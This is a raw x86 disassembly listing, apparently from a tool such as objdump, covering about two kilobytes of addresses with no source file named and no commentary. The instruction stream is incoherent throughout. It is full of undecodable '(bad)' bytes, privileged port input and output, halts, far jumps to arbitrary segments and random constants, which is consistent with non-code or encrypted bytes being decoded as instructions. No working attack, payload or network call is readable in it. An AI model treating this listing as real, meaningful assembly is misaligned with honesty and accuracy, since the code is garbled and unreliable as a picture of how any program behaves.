  417d3e:	dec    ebp
  417d3f:	call   0xc82b984f
  417d44:	cli    
  417d45:	pusha  
  417d46:	inc    edi
  417d47:	jp     0x417d59
  417d49:	adc    BYTE PTR [ebp-0xa63bfe9],dl
  417d4f:	and    esi,DWORD PTR [ecx+0x5d]
  417d52:	mov    ch,0xd4
  417d54:	ins    DWORD PTR es:[edi],dx
  417d55:	push   edx
  417d56:	or     eax,0xb56e6eac
  417d5b:	sbb    eax,0xd4e6bc44
  417d60:	xchg   esp,eax
  417d61:	(bad)  
  417d62:	mov    edx,0x35cea1a
  417d67:	mov    WORD PTR [eax-0x7a980aba],fs
  417d6d:	inc    esp
  417d6e:	and    esi,ecx
  417d70:	sbb    eax,0xf79d13bf
  417d75:	pop    ss
  417d76:	(bad)  [edi-0x30124a5a]
  417d7c:	lods   eax,DWORD PTR ds:[esi]
  417d7d:	mov    edi,0x53780827
  417d82:	mov    DWORD PTR [esi+ebx*2],ebp
  417d85:	xchg   ebx,eax
  417d86:	imul   esp,ecx,0x35
  417d89:	jge    0x417ded
  417d8b:	add    edi,edx
  417d8d:	sbb    al,0xc6
  417d8f:	mov    ecx,0x30106338
  417d94:	into   
  417d95:	ins    DWORD PTR es:[edi],dx
  417d96:	loopne 0x417d77
  417d98:	js     0x417ded
  417d9a:	in     eax,0x64
  417d9c:	fsubr  DWORD PTR [esi+0x2e]
  417d9f:	jb     0x417e01
  417da1:	xchg   esp,eax
  417da2:	popa   
  417da3:	jns    0x417da9
  417da5:	lods   al,BYTE PTR fs:[esi]
  417da7:	push   cs
  417da8:	popf   
  417da9:	or     ecx,DWORD PTR [ebx+edx*8-0x2415457b]
  417db0:	test   BYTE PTR [edi+0x50672d12],ch
  417db6:	imul   ebp,esi,0x6b7e32a0
  417dbc:	xchg   esi,eax
  417dbd:	xor    ecx,0xffffffbd
  417dc0:	cmp    eax,0x6b66d94b
  417dc5:	out    dx,al
  417dc6:	fadd   QWORD PTR [edx]
  417dc8:	fidiv  WORD PTR [edx-0x566c7a1d]
  417dce:	ss (bad) 
  417dd0:	leave  
  417dd1:	mov    esp,0x2fcf407
  417dd6:	sti    
  417dd7:	jno    0x417dec
  417dd9:	mov    dh,0x35
  417ddb:	icebp  
  417ddc:	ret    
  417ddd:	fidiv  WORD PTR [edx-0x4d004f6f]
  417de3:	(bad)  
  417de4:	jne    0x417def
  417de6:	sbb    al,0xf2
  417de8:	retf   
  417de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dea:	gs mov bh,0x17
  417ded:	pop    ebp
  417dee:	mov    DWORD PTR [edi],esi
  417df0:	sbb    BYTE PTR [ebx+edi*4+0x26],bh
  417df4:	xor    BYTE PTR [ebx],ah
  417df6:	into   
  417df7:	test   eax,0xd7412030
  417dfc:	in     al,0xce
  417dfe:	ret    
  417dff:	inc    ebx
  417e00:	imul   edi,DWORD PTR [ebx],0xffffffae
  417e03:	aaa    
  417e04:	mov    ebp,0x1105e1f
  417e09:	push   edx
  417e0a:	mul    DWORD PTR [eax+0xd]
  417e0d:	mov    dh,0x5a
  417e0f:	test   BYTE PTR [ebx+0xf],0xea
  417e13:	cmc    
  417e14:	mov    al,0x2a
  417e16:	ds pop edx
  417e18:	jns    0x417da4
  417e1a:	or     BYTE PTR [ebx+0x2834beb9],bl
  417e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e21:	add    eax,0x4820e793
  417e26:	data16 (bad) 
  417e28:	lds    ebx,FWORD PTR [edi+0x78889133]
  417e2e:	or     DWORD PTR [eax-0x20da84e],0x2e549601
  417e38:	ja     0x417e88
  417e3a:	inc    ebx
  417e3b:	(bad)  
  417e3c:	retf   
  417e3d:	inc    esi
  417e3e:	jns    0x417e4f
  417e40:	aad    0xb7
  417e42:	cmovne esi,DWORD PTR [ecx]
  417e45:	(bad)  
  417e46:	mov    ebp,0x1d26e097
  417e4b:	daa    
  417e4c:	and    dh,ah
  417e4e:	lods   eax,DWORD PTR ds:[esi]
  417e4f:	and    al,0xa4
  417e51:	fadd   QWORD PTR [esi-0x16]
  417e54:	dec    ebx
  417e55:	(bad)  
  417e56:	pop    edx
  417e57:	adc    DWORD PTR [edx+eax*4-0x7f],eax
  417e5b:	mul    edx
  417e5d:	jmp    0x417eb5
  417e5f:	(bad)  
  417e60:	fnstsw WORD PTR [ecx+0x3]
  417e63:	dec    edx
  417e64:	pop    ecx
  417e65:	xchg   ebx,eax
  417e66:	sub    DWORD PTR [edi-0x58],esp
  417e69:	push   esi
  417e6a:	popa   
  417e6b:	sub    edi,ebx
  417e6d:	jg     0x417eab
  417e6f:	sub    eax,0x1b6558e5
  417e74:	(bad)  [ecx-0xc463d8b]
  417e7a:	fild   DWORD PTR [eax+ebp*4]
  417e7d:	mov    ds:0x95f18b16,eax
  417e82:	lods   eax,DWORD PTR ds:[esi]
  417e83:	rol    BYTE PTR [ebx+0x37],cl
  417e86:	jle    0x417e51
  417e88:	mov    ah,0xaa
  417e8a:	frstor [ebp-0x2b]
  417e8d:	jno    0x417e15
  417e8f:	and    ebx,DWORD PTR [edx]
  417e91:	das    
  417e92:	imul   esp,DWORD PTR [esi-0x13],0x82061f7d
  417e99:	sbb    al,0x24
  417e9b:	jmp    0xaa70:0x9bdeb6ec
  417ea2:	pusha  
  417ea3:	or     ebx,DWORD PTR [ebx]
  417ea5:	dec    edi
  417ea6:	fmul   st,st(3)
  417ea8:	xor    dh,BYTE PTR [edi]
  417eaa:	std    
  417eab:	repz pop ebx
  417ead:	ins    DWORD PTR es:[edi],dx
  417eae:	fidiv  WORD PTR [edi+0x5f6fafb4]
  417eb4:	rcl    BYTE PTR [ecx-0x74],0x90
  417eb8:	clc    
  417eb9:	in     al,dx
  417eba:	pop    esp
  417ebb:	pop    esi
  417ebc:	pushf  
  417ebd:	clc    
  417ebe:	nop
  417ebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ec0:	addr16 ja 0x417e48
  417ec3:	add    BYTE PTR [esi+0x5b],dh
  417ec6:	sub    DWORD PTR [edi-0x36],0x33
  417eca:	add    cl,ah
  417ecc:	or     esp,ebp
  417ece:	sub    eax,0xb5a19e1d
  417ed3:	jnp    0x417e59
  417ed5:	inc    ebx
  417ed6:	or     al,0xc9
  417ed8:	shl    BYTE PTR [ebp+0x41],cl
  417edb:	ja     0x417f4d
  417edd:	test   DWORD PTR [edi+0x2c3ff35d],esp
  417ee3:	int3   
  417ee4:	adc    al,0x30
  417ee6:	and    eax,0xe39f4aa8
  417eeb:	adc    DWORD PTR ds:0x2f7a7a6,ebx
  417ef1:	dec    esi
  417ef2:	hlt    
  417ef3:	addr16 push ss
  417ef5:	ins    DWORD PTR es:[edi],dx
  417ef6:	and    BYTE PTR ss:[ebx+0x613f812b],dh
  417efd:	jmp    0x3119:0xf63982e
  417f04:	xchg   edi,eax
  417f05:	jno    0x417f44
  417f07:	lds    esi,FWORD PTR [esi+ecx*1]
  417f0a:	and    eax,0x6d119180
  417f0f:	fiadd  WORD PTR es:[ecx+0xb]
  417f13:	and    ch,BYTE PTR [eax+0x5d12c22c]
  417f19:	push   edi
  417f1a:	cmp    al,0x88
  417f1c:	sub    edx,eax
  417f1e:	fimul  WORD PTR [esi-0x15c716c8]
  417f24:	push   ebp
  417f25:	mov    cl,0xa9
  417f27:	pop    es
  417f28:	push   ds
  417f29:	test   al,0xb0
  417f2b:	outs   dx,BYTE PTR ds:[esi]
  417f2c:	hlt    
  417f2d:	push   edi
  417f2e:	adc    DWORD PTR [edx-0x4f],esp
  417f31:	(bad)  
  417f32:	mov    bl,0x1a
  417f34:	(bad)
  417f37:	mov    dh,0x8
  417f39:	dec    edx
  417f3a:	dec    edi
  417f3b:	sbb    BYTE PTR [eax+0x21],ah
  417f3e:	nop
  417f3f:	inc    ebp
  417f40:	jns    0x417ef0
  417f42:	cld    
  417f43:	lahf   
  417f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f45:	arpl   WORD PTR [ebp+0x2c],sp
  417f48:	icebp  
  417f49:	or     al,0x52
  417f4b:	or     al,0xc7
  417f4d:	pop    eax
  417f4e:	sub    DWORD PTR [ecx+esi*1-0x641b2d7f],edi
  417f55:	dec    esp
  417f56:	jmp    0x417fb8
  417f58:	mov    BYTE PTR [edx+0x3b],0x3e
  417f5c:	das    
  417f5d:	cdq    
  417f5e:	mov    eax,0xf515f5eb
  417f63:	div    BYTE PTR [ecx+0x49e0b72]
  417f69:	and    eax,0xd7e6ea56
  417f6e:	cs ins DWORD PTR es:[edi],dx
  417f70:	mov    dh,ah
  417f72:	jg     0x417fec
  417f74:	mov    bl,0x37
  417f76:	pop    esp
  417f77:	inc    esi
  417f78:	js     0x417f6a
  417f7a:	push   0xffffffca
  417f7c:	mov    dl,ah
  417f7e:	out    0xc5,eax
  417f80:	into   
  417f81:	pusha  
  417f82:	popa   
  417f83:	mov    ah,0xf3
  417f85:	jp     0x417ff7
  417f87:	inc    esi
  417f88:	cmp    al,0xa2
  417f8a:	jmp    0x38c4:0x8ccbc1b5
  417f91:	out    0x3,eax
  417f93:	mov    esp,0xbf7a3cca
  417f98:	mov    esp,0x8b2ccaa0
  417f9d:	(bad)  
  417f9e:	xor    ah,BYTE PTR [edx]
  417fa0:	or     eax,0xe2673c12
  417fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fa6:	cmp    edx,DWORD PTR [edx]
  417fa8:	aas    
  417fa9:	(bad)  
  417fab:	inc    esi
  417fac:	inc    ebp
  417fad:	pop    esp
  417fae:	sbb    eax,0x9bcbd988
  417fb3:	mov    eax,0x9e631284
  417fb8:	nop
  417fb9:	jecxz  0x417f4e
  417fbb:	or     DWORD PTR [ebx+0x62],esi
  417fbe:	cmc    
  417fbf:	mov    ss:0x8f7ed97e,eax
  417fc5:	mov    ah,0xf9
  417fc7:	lds    ebx,FWORD PTR [edi]
  417fc9:	aad    0x99
  417fcb:	ret    
  417fcc:	int3   
  417fcd:	test   BYTE PTR [ecx-0x55],dh
  417fd0:	mov    ds:0xf099ea39,al
  417fd5:	fcmovnbe st,st(6)
  417fd7:	add    ch,0x89
  417fda:	sbb    DWORD PTR [edx-0x6b],edx
  417fdd:	add    cl,bh
  417fdf:	and    cl,BYTE PTR [edx+0x37a74e9]
  417fe5:	stos   BYTE PTR es:[edi],al
  417fe6:	imul   ebp,DWORD PTR [ebp-0x75],0x63
  417fea:	jno    0x417feb
  417fec:	loope  0x417fbd
  417fee:	xchg   ebp,eax
  417fef:	xor    edx,ecx
  417ff1:	push   ebp
  417ff2:	ror    BYTE PTR [eax+0x60],cl
  417ff5:	adc    eax,0x1e5a4869
  417ffa:	pushf  
  417ffb:	pop    eax
  417ffc:	repnz arpl bp,dx
  417fff:	inc    esp
  418000:	mov    eax,0x7743dcd
  418005:	jbe    0x418037
  418007:	inc    ebp
  418008:	mov    WORD PTR [eax+eax*2],ss
  41800b:	jmp    0xbe20:0xbd93dfbe
  418012:	mov    edi,0xd7813220
  418017:	mov    ch,bh
  418019:	xor    dl,BYTE PTR [eax+edx*1+0x7f60a626]
  418020:	sub    BYTE PTR ss:[edx+ebp*8-0x7d],0xb5
  418026:	std    
  418027:	(bad)  
  418028:	mov    esi,ss
  41802a:	mov    eax,ds:0x5d430bef
  41802f:	mov    edx,0xe24b4433
  418034:	adc    ch,BYTE PTR [eax+0x2d544f58]
  41803a:	pop    eax
  41803b:	mov    dh,0x29
  41803d:	stos   DWORD PTR es:[edi],eax
  41803e:	sub    al,dh
  418040:	mov    bl,0xfe
  418042:	ret    
  418043:	cmp    eax,0xeb2ebbc0
  418048:	mov    eax,0xb3b61ea0
  41804d:	mov    ds:0x562182ca,eax
  418052:	rcr    ah,0x87
  418055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418056:	adc    DWORD PTR [ecx+0x3749fd6b],eax
  41805c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41805d:	inc    esp
  41805e:	sti    
  41805f:	rol    al,1
  418061:	stos   DWORD PTR es:[edi],eax
  418062:	push   ebx
  418063:	mov    bh,0xd1
  418065:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  418067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418068:	and    ebp,ebx
  41806a:	and    DWORD PTR [esi-0x4bf13fa6],edi
  418070:	push   ebx
  418071:	push   esp
  418072:	sub    eax,0x4c70ca0a
  418077:	dec    edi
  418078:	xor    BYTE PTR [esp+edx*4+0xa],bl
  41807c:	mov    esp,DWORD PTR [edx+0x19]
  41807f:	popa   
  418080:	int3   
  418081:	cs or  eax,ebp
  418084:	stc    
  418085:	lods   eax,DWORD PTR ds:[esi]
  418086:	jecxz  0x4180d6
  418088:	aas    
  418089:	rcr    al,1
  41808b:	sub    al,0xdc
  41808d:	sbb    DWORD PTR [eax-0x7106c081],esp
  418093:	ror    bh,0x12
  418096:	and    DWORD PTR [edx],esi
  418098:	or     esi,esi
  41809a:	in     al,0x87
  41809c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41809d:	dec    edi
  41809e:	inc    ecx
  41809f:	add    BYTE PTR [edx-0xa],ch
  4180a2:	scas   al,BYTE PTR es:[edi]
  4180a3:	xor    edi,DWORD PTR [ecx+ecx*4]
  4180a6:	mov    bh,0x37
  4180a8:	cli    
  4180a9:	lods   eax,DWORD PTR ds:[esi]
  4180aa:	xor    ebp,DWORD PTR [edx+ecx*8]
  4180ad:	jno    0x41812a
  4180af:	imul   esp,DWORD PTR [eax],0x7a
  4180b2:	mul    DWORD PTR [ebx+ebx*1-0x31]
  4180b6:	in     al,dx
  4180b7:	das    
  4180b8:	mov    bh,0xfc
  4180ba:	js     0x41809e
  4180bc:	jp     0x418090
  4180be:	in     eax,0x40
  4180c0:	shl    edi,0xbc
  4180c3:	sbb    al,0x7c
  4180c5:	pop    es
  4180c6:	xchg   DWORD PTR ds:0xa9790cd5,ecx
  4180cc:	js     0x4180dc
  4180ce:	pop    edx
  4180cf:	push   0xffffffc5
  4180d1:	out    dx,eax
  4180d2:	jns    0x4180c4
  4180d4:	ret    0xa3ba
  4180d7:	adc    edx,DWORD PTR [esi]
  4180d9:	inc    esp
  4180da:	mov    ds:0x7577cffe,eax
  4180df:	outs   dx,DWORD PTR ds:[esi]
  4180e0:	das    
  4180e1:	or     ah,BYTE PTR [ecx-0x6f]
  4180e4:	lahf   
  4180e5:	mov    WORD PTR [esi],ds
  4180e7:	and    dl,BYTE PTR [ebp+0x5e]
  4180ea:	in     al,dx
  4180eb:	icebp  
  4180ec:	inc    ebp
  4180ed:	in     eax,dx
  4180ee:	leave  
  4180ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180f0:	cmp    DWORD PTR [esi],0x9034c69f
  4180f6:	mov    ?,WORD PTR [eax-0x5d8d2b8e]
  4180fc:	push   ecx
  4180fd:	fwait
  4180fe:	jp     0x418090
  418100:	mov    al,ds:0x79a74900
  418105:	leave  
  418106:	shl    DWORD PTR [edx-0x3afdf69c],cl
  41810c:	ret    0x40fe
  41810f:	test   DWORD PTR [edi+0x10a16fe0],0x3641b6cf
  418119:	loop   0x418124
  41811b:	test   DWORD PTR [edx-0x1191860d],0x54021bb4
  418125:	sbb    eax,DWORD PTR [edi]
  418127:	repz push ecx
  418129:	or     DWORD PTR [ebx],eax
  41812b:	addr16 mov ds:0xe95b,al
  41812f:	xor    DWORD PTR [ecx],ecx
  418131:	push   0xffffff8b
  418133:	(bad)  
  418134:	or     al,0xd4
  418136:	and    dh,BYTE PTR [edx+0x57a77b9c]
  41813c:	lahf   
  41813d:	add    al,0x43
  41813f:	enter  0xc37e,0x9
  418143:	or     eax,0x3cf6b848
  418148:	pop    es
  418149:	(bad)  
  41814a:	jbe    0x4181a2
  41814c:	mov    ah,0xc1
  41814e:	in     eax,0x76
  418150:	inc    edi
  418151:	mov    bl,0xf6
  418153:	inc    esi
  418154:	fidiv  WORD PTR [esi]
  418156:	aam    0xe5
  418158:	pop    ecx
  418159:	cld    
  41815a:	je     0x4180fe
  41815c:	rcl    DWORD PTR [ecx-0x49],0x5e
  418160:	stos   DWORD PTR es:[edi],eax
  418161:	mov    dh,bl
  418163:	pop    ebx
  418164:	repz gs mov ecx,0x26cab836
  41816b:	sahf   
  41816c:	fist   WORD PTR [ecx+ecx*4-0x2e1184c8]
  418173:	loop   0x4181a9
  418175:	fistp  WORD PTR [eax+0x2c5050e8]
  41817b:	ret    
  41817c:	cmp    DWORD PTR [esi+0x6548933b],esp
  418182:	mov    esp,DWORD PTR [eax]
  418184:	pop    esi
  418185:	out    0x48,al
  418187:	retf   
  418188:	stc    
  418189:	es adc eax,0xe953a2e2
  41818f:	or     ebp,DWORD PTR [edi+0x58]
  418192:	fstp   st(5)
  418194:	mov    ecx,0xfedbecc0
  418199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41819a:	nop
  41819b:	jmp    0xd05fea93
  4181a0:	icebp  
  4181a1:	sbb    ebx,DWORD PTR [edi+0x6b1af3d4]
  4181a7:	xor    al,BYTE PTR [ebp-0x52189862]
  4181ad:	aad    0xa6
  4181af:	sbb    DWORD PTR [eax+0x57ae50e3],0x44
  4181b6:	cld    
  4181b7:	mov    eax,ds:0x81ed8ccf
  4181bc:	cmp    BYTE PTR [edi+0x7d],bl
  4181bf:	cdq    
  4181c0:	jl     0x418159
  4181c2:	or     BYTE PTR [eax+esi*1+0x6c9906dd],bl
  4181c9:	mov    cl,0xd7
  4181cb:	push   DWORD PTR [eax-0x2492f87d]
  4181d1:	dec    ecx
  4181d2:	jg     0x4181bc
  4181d4:	cs cmc 
  4181d6:	fwait
  4181d7:	push   ss
  4181d8:	stos   BYTE PTR es:[edi],al
  4181d9:	int3   
  4181da:	xchg   ebp,eax
  4181db:	retf   0xab86
  4181de:	mov    ebp,0xe84a30cf
  4181e3:	imul   ecx,DWORD PTR [ecx-0x16bbe6e4],0xffffffd8
  4181ea:	mov    eax,0xd4612297
  4181ef:	jne    0x41826f
  4181f1:	retf   0xdb6f
  4181f4:	cmp    BYTE PTR [eax-0x4abe7a9b],ch
  4181fa:	fimul  DWORD PTR [edi]
  4181fc:	sub    esp,DWORD PTR [edx+0x64fbf87b]
  418202:	std    
  418203:	jne    0x418216
  418205:	xor    eax,DWORD PTR [eax]
  418207:	cwde   
  418208:	daa    
  418209:	xor    BYTE PTR [eax+0x3c],0xa3
  41820d:	retf   
  41820e:	leave  
  41820f:	sbb    bl,dh
  418211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418212:	add    eax,0xf5cf36eb
  418217:	dec    esp
  418218:	jg     0x418261
  41821a:	lock jne 0x4181df
  41821d:	scas   al,BYTE PTR es:[edi]
  41821e:	(bad)  
  41821f:	retf   
  418220:	ror    BYTE PTR [ebx-0x62d80d9a],0x5d
  418227:	pop    ds
  418228:	nop
  418229:	dec    ecx
  41822a:	cli    
  41822b:	lock jae 0x418260
  41822e:	mov    al,0xe4
  418230:	inc    esi
  418231:	xor    ch,BYTE PTR [esi+0x2998ed0]
  418237:	std    
  418238:	push   edx
  418239:	xchg   edx,eax
  41823a:	into   
  41823b:	fcomp  QWORD PTR [esi+eiz*1-0x72b1a4f7]
  418242:	stos   DWORD PTR es:[edi],eax
  418243:	dec    edi
  418244:	mov    ah,0xb4
  418246:	pushf  
  418247:	into   
  418248:	into   
  418249:	jb     0x41820c
  41824b:	out    0xda,al
  41824d:	and    al,0x27
  41824f:	jbe    0x41821e
  418251:	dec    ebx
  418252:	jnp    0x4182a9
  418254:	cli    
  418255:	pop    ebx
  418256:	int3   
  418257:	add    dh,BYTE PTR [ebx]
  418259:	pop    ss
  41825a:	mov    eax,ds:0xd1a3fa64
  41825f:	sub    ah,ah
  418261:	ret    
  418262:	mov    al,0xd9
  418264:	in     eax,0xac
  418266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418267:	mov    WORD PTR [ecx+0x37],cs
  41826a:	push   cs
  41826b:	imul   ebp
  41826d:	mov    ds:0x473bf107,eax
  418272:	arpl   WORD PTR [ecx+0x24],bx
  418275:	sbb    eax,0xefa95468
  41827a:	adc    al,0x22
  41827c:	jge    0x4182ab
  41827e:	add    ebx,DWORD PTR [eax+0x18]
  418281:	je     0x418289
  418283:	xchg   esi,eax
  418284:	pusha  
  418285:	jge    0x41820e
  418287:	xchg   edi,eax
  418288:	cld    
  418289:	mov    esp,0x9f7e16d8
  41828e:	out    0x7,al
  418290:	mov    esi,ebp
  418292:	sahf   
  418293:	in     eax,dx
  418294:	xor    BYTE PTR [ecx+0x39],cl
  418297:	mov    cl,0xaa
  418299:	out    0x8b,eax
  41829b:	mov    bh,0xbb
  41829d:	xor    eax,0x229b0a29
  4182a2:	test   al,0x3a
  4182a4:	xor    DWORD PTR [esi+0x63],eax
  4182a7:	mov    dl,0x90
  4182a9:	pop    ds
  4182aa:	adc    eax,0x4c578ecb
  4182af:	enter  0xe2e8,0xc7
  4182b3:	icebp  
  4182b4:	out    0xb0,eax
  4182b6:	sbb    ebx,edx
  4182b8:	punpckhdq mm0,QWORD PTR [ebx+0x4463bac9]
  4182bf:	inc    edi
  4182c0:	mov    ch,0xaa
  4182c2:	pop    ebx
  4182c3:	sub    DWORD PTR ds:0xbd8f23fd,0x5e5d757e
  4182cd:	xchg   eax,ebp
  4182cf:	push   ecx
  4182d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182d1:	fcmovne st,st(3)
  4182d3:	inc    edi
  4182d4:	mov    esp,DWORD PTR [edx]
  4182d6:	xor    eax,0xaa52362d
  4182db:	out    0x20,eax
  4182dd:	mov    ebx,0xe17f89c9
  4182e2:	stc    
  4182e3:	adc    bl,0x42
  4182e6:	dec    ecx
  4182e7:	jge    0x4182c6
  4182e9:	xor    BYTE PTR [ecx+edi*4],ah
  4182ec:	push   cs
  4182ed:	xor    eax,0xc91017d
  4182f2:	mov    ch,0xc6
  4182f4:	mov    ch,0x4d
  4182f6:	test   eax,0xf86e7a91
  4182fb:	not    BYTE PTR [ebp+0x28ba9664]
  418301:	cmp    DWORD PTR [eax+0x1c],edx
  418304:	push   ebp
  418305:	cwde   
  418306:	std    
  418307:	loopne 0x418344
  418309:	lds    ecx,FWORD PTR [esi-0x5b]
  41830c:	cmp    ch,bl
  41830e:	clc    
  41830f:	jle    0x4182cd
  418311:	mov    ebx,0xd50ee792
  418316:	sar    DWORD PTR gs:[ebx],cl
  418319:	jns    0x4182cd
  41831b:	mov    dl,0x2c
  41831d:	pop    ebx
  41831e:	(bad)  
  41831f:	push   ss
  418320:	dec    DWORD PTR ds:0x96eadc0b
  418326:	sub    WORD PTR [edi+0x7],bp
  41832a:	pop    edi
  41832b:	dec    edi
  41832c:	mov    ebx,0x7d7ffd04
  418331:	or     DWORD PTR [edi+0x2de9a63d],esi
  418337:	loop   0x418350
  418339:	loopne 0x418377
  41833b:	adc    ch,ah
  41833d:	push   0x3fc343af
  418342:	sbb    DWORD PTR [eax+ebx*1-0x33],edi
  418346:	mov    eax,ds:0x4b4320c9
  41834b:	imul   edi,DWORD PTR [ebx],0x467b11b9
  418351:	xlat   BYTE PTR ds:[ebx]
  418352:	pop    es
  418353:	retf   0x8798
  418356:	or     dh,BYTE PTR [edi-0x21ce7049]
  41835c:	fisttp DWORD PTR [edx+0x3b]
  41835f:	iret   
  418360:	jmp    0x4182f6
  418362:	inc    edi
  418363:	jbe    0x4183d6
  418365:	mov    cs,WORD PTR [esi]
  418367:	ins    DWORD PTR es:[edi],dx
  418368:	fdiv   DWORD PTR [ecx]
  41836a:	sub    al,0x3f
  41836c:	adc    eax,0x5777f44e
  418371:	scas   eax,DWORD PTR es:[edi]
  418372:	jns    0x418373
  418374:	adc    esi,0xe6dd10c
  41837a:	dec    ebx
  41837b:	mov    es,WORD PTR [ebx-0xae738fa]
  418381:	cmp    BYTE PTR [eax-0x33],dl
  418384:	out    0xd6,eax
  418386:	popa   
  418387:	sahf   
  418388:	and    dl,BYTE PTR [eax-0x71f40cf8]
  41838e:	icebp  
  41838f:	iret   
  418390:	jg     0x41838e
  418392:	mov    esp,0xb7e94a87
  418397:	loop   0x4183d4
  418399:	(bad)  
  41839a:	stc    
  41839b:	loopne 0x4183c5
  41839d:	add    al,0x70
  41839f:	push   esp
  4183a0:	pop    esi
  4183a1:	neg    dh
  4183a3:	or     edi,0xc0c3ff4
  4183a9:	jg     0x4183b1
  4183ab:	pop    DWORD PTR [ecx-0x4e00c337]
  4183b1:	cmp    DWORD PTR [ebp+0x18],esp
  4183b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183b5:	mov    esp,0x27592156
  4183ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183bb:	or     cl,BYTE PTR [esi]
  4183bd:	xchg   ecx,eax
  4183be:	and    dl,BYTE PTR [ebx]
  4183c0:	push   ds
  4183c1:	push   edx
  4183c2:	call   0xd9a8:0xd4682be7
  4183c9:	xchg   edx,eax
  4183ca:	ins    DWORD PTR es:[edi],dx
  4183cb:	or     bl,BYTE PTR [edx+0x5c]
  4183ce:	imul   DWORD PTR [edi+0x318d0ec8]
  4183d4:	inc    esp
  4183d5:	nop
  4183d6:	xchg   esp,eax
  4183d7:	call   0x562b:0xd8cacfc
  4183de:	adc    al,0x89
  4183e0:	inc    ecx
  4183e1:	dec    eax
  4183e2:	das    
  4183e3:	dec    esp
  4183e4:	test   esp,0xf521ffa2
  4183ea:	ss mov ?,edx
  4183ed:	inc    ebx
  4183ee:	in     al,0xb9
  4183f0:	pop    edx
  4183f1:	hlt    
  4183f2:	lahf   
  4183f3:	shl    DWORD PTR [ecx-0x56],1
  4183f6:	and    DWORD PTR [ecx+0x2d],esp
  4183f9:	or     bl,BYTE PTR [ecx+ecx*4-0xf3adde9]
  418400:	shl    DWORD PTR [ebp+0x64e23a71],0xd7
  418407:	mov    cl,0x7e
  418409:	ins    DWORD PTR es:[edi],dx
  41840a:	mov    esi,0x8635d803
  41840f:	pop    ebx
  418410:	lock jo 0x4183fd
  418413:	mov    ecx,0x6d9d7f65
  418418:	sbb    eax,0x91551d7e
  41841d:	jp     0x41847f
  41841f:	mov    al,ds:0xb1f0d5dc
  418424:	dec    esi
  418425:	popf   
  418426:	mov    BYTE PTR [eax-0xe4732f2],0x8
  41842d:	jg     0x41842c
  41842f:	dec    edx
  418430:	push   edi
  418431:	add    DWORD PTR [eax],ebx
  418433:	mov    eax,ds:0x2720e905
  418438:	xor    bl,BYTE PTR [edx+0x7b]
  41843b:	pop    edx
  41843c:	std    
  41843d:	jl     0x41844a
  41843f:	xchg   edi,eax
  418440:	pop    ss
  418441:	or     esi,DWORD PTR [eax-0x80]
  418444:	stc    
  418445:	or     eax,0xd089086
  41844a:	or     eax,0xa08c8121
  41844f:	fadd   st,st(6)
  418451:	inc    esi
  418452:	push   esp
  418453:	mov    eax,0xf4b767d8
  418458:	jecxz  0x418470
  41845a:	mov    ds:0xbf1589ff,al
  41845f:	addr16 cld 
  418461:	jne    0x41843d
  418463:	mov    ebp,0x8e5940f5
  418468:	clc    
  418469:	fcomp  QWORD PTR [ecx+eiz*8]
  41846c:	in     al,0x68
  41846e:	jb     0x41844b
  418470:	adc    BYTE PTR [esp+edx*4-0x2711926],dh
  418477:	rcl    DWORD PTR [edi+edi*8],1
  41847a:	sbb    eax,0xe607bbdd
  41847f:	imul   esi,DWORD PTR [esp+esi*8+0x2d],0xffffff99
  418484:	jl     0x4184e8
  418486:	cmp    ecx,ebx
  418488:	or     eax,0xcd35abac
  41848d:	daa    
  41848e:	pop    esp
  41848f:	mov    ecx,0x42c2ace4
  418494:	mov    al,0xf2
  418496:	or     eax,DWORD PTR [ebp+0x2360070e]
  41849c:	add    DWORD PTR [ebx],esp
  41849e:	dec    esi
  41849f:	mov    ah,BYTE PTR [esi]
  4184a1:	je     0x418513
  4184a3:	and    DWORD PTR ds:0x46cf3a6b,0x3514022a
  4184ad:	xchg   esi,eax
  4184ae:	std    
  4184af:	xchg   ebp,eax
  4184b0:	or     ch,cl
  4184b2:	pop    es
  4184b3:	add    BYTE PTR [eax+edi*4-0x5f92c507],0xc7
  4184bb:	je     0x41843d
  4184bd:	pop    ss
  4184be:	or     cl,ch
  4184c0:	jmp    0x34e9:0xa2ef1d64
  4184c7:	push   esp
  4184c8:	jb     0x4184aa
  4184ca:	inc    ebp
  4184cb:	adc    BYTE PTR [ebx+0x565921a4],dl
  4184d1:	mov    cl,0xb8
  4184d3:	xchg   DWORD PTR [edi+0x9],edx
  4184d6:	inc    edi
  4184d7:	enter  0xc4e3,0x96
  4184db:	cli    
  4184dc:	jmp    0x5ff8:0xdd8ece64
  4184e3:	inc    ecx
  4184e4:	rol    WORD PTR [eax+0x59bec045],0x3
  4184ec:	mov    edi,0x8541266
  4184f1:	icebp  
  4184f2:	mov    ch,0x73
  4184f4:	iret   
  4184f5:	enter  0x40be,0xc1
  4184f9:	jnp    0x41856e
  4184fb:	mov    ds:0x46573f06,al
  418500:	mov    ebp,0x32fd0f98
  418505:	xchg   esp,eax
  418506:	pop    ds
  418507:	hlt    
  418508:	xor    bl,BYTE PTR [esi-0x6b]
  41850b:	inc    eax
  41850c:	push   esp
  41850d:	adc    al,0x60
  41850f:	(bad)  
  418510:	and    edx,DWORD PTR [ecx+ebx*2]
  418513:	jo     0x4184a3
  418515:	xchg   BYTE PTR [ebx+0x43],bl
  418518:	sar    BYTE PTR [esi-0x57],cl
  41851b:	lods   al,BYTE PTR ds:[esi]
  41851c:	fsub   st(6),st
  41851e:	and    al,0xc6
  418520:	adc    ch,BYTE PTR [ebx]
  418522:	mul    BYTE PTR [edi]
